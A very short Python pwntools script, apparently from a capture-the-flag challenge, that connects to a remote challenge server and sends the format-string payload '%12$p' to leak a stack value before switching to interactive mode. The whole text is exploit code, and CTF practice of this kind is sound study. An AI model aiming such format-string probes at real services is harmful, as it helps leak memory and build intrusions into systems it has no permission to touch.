from pwn import *

io = remote("node5.anna.nssctf.cn", 27663)
payload = b"%12$p"
io.sendline(payload)
io.interactive()
